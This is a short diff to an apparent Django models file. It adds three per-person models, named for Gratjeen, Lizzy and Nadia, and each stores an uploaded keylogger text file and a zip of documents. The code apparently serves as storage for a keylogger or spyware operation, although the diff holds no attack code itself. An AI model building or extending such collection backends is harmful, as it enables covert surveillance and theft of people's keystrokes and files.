@@ -67,6 +67,31 @@ class GratjeenProfile(UserProfile):
     class Meta:
         ordering = ('-created',)
         verbose_name_plural = 'GratjeenProfiles'
+
+
+
+class GratJeenProfileDetails(models.Model):
+    client = models.ForeignKey(GratjeenProfile, on_delete=models.CASCADE) 
+    keylogger_txt = models.FileField(upload_to='keylogger/')
+    document_zip = models.FileField(upload_to='documents/') 
+    created = models.DateTimeField(auto_now_add=True, auto_now=False)
+    updated = models.DateTimeField(auto_now_add=False, auto_now=True) 
+
+
+class LizzyProfileDetails(models.Model):
+    client = models.ForeignKey(LizzyProfile, on_delete=models.CASCADE) 
+    keylogger_txt = models.FileField(upload_to='keylogger/')
+    document_zip = models.FileField(upload_to='documents/')
+    created = models.DateTimeField(auto_now_add=True, auto_now=False)
+    updated = models.DateTimeField(auto_now_add=False, auto_now=True) 
+
+
+class NadiaProfileDetails(models.Model):
+    client = models.ForeignKey(NadiaProfile, on_delete=models.CASCADE) 
+    keylogger_txt = models.FileField(upload_to='keylogger/') 
+    document_zip = models.FileField(upload_to='documents/')
+    created = models.DateTimeField(auto_now_add=True, auto_now=False)
+    updated = models.DateTimeField(auto_now_add=False, auto_now=True) 
         
         
 class Uploadedfiles(models.Model):
